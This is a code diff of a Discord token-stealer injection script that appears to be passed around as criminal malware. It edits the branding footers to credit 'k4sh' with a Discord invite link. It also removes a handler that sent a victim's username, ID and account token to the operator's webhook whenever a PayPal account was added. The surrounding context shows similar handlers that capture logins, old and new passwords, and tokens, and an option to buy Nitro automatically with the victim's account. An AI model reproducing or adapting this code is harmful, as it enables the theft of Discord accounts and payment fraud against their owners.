@@ -710,7 +710,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Aryzs Stealer V2.0',
+          text: 'edit by k4sh original stealer: https://discord.gg/hTDQBmza6F',
         },
       },
     ],
@@ -765,7 +765,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'k4sh stealer',
+            text: 'edit by k4sh original stealer: https://discord.gg/hTDQBmza6F',
           },
         },
       ],
@@ -814,7 +814,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'k4sh stealer',
+            text: 'edit by k4sh original stealer: https://discord.gg/hTDQBmza6F',
           },
         },
       ],
@@ -823,52 +823,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
     hooker(content);
   };
   
-  const PaypalAdded = async (token) => {
-    const json = await getInfo(token);
-    const nitro = getNitro(json.premium_type);
-    const badges = getBadges(json.flags);
-    const billing = getBilling(token);
-    const content = {
-      username: config.embed_name,
-      avatar_url: config.embed_icon,
-      embeds: [
-        {
-          color: config.embed_color,
-          fields: [
-            {
-              name: '<:paypal:973900908528275457> Paypal Added!',
-              value: `Time to buy some nitro baby 😩`,
-              inline: false,
-            },
-            {
-              name: '<:user:984848317836050442> Username',
-              value: `\`${json.username}#${json.discriminator}\``,
-              inline: true,
-            },
-            {
-              name: '<:id2:814280058402242562> ID',
-              value: `\`${json.id}\``,
-              inline: true,
-            },
-            {
-              name: '<:bug_hunter:973311712709181542> Token',
-              value: `\`\`\`${token}\`\`\``,
-              inline: false,
-            },
-          ],
-          author: {
-            name: json.username + '#' + json.discriminator + ' | ' + json.id,
-            icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-          },
-          footer: {
-            text: 'k4sh stealer',
-          },
-        },
-      ],
-    };
-    if (config.ping_on_run) content['content'] = config.ping_val;
-    hooker(content);
-  };
+
   
 
   
@@ -912,7 +867,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'k4sh stealer',
+            text: 'edit by k4sh original stealer: https://discord.gg/hTDQBmza6F',
           },
         },
       ],
@@ -985,10 +940,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
   
 
   
-      case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-        PaypalAdded(token).catch(console.error);
-        break;
-  
+     
       case details.url.endsWith('confirm') && details.method === 'POST':
         if (!config.auto_buy_nitro) return;
         setTimeout(() => {
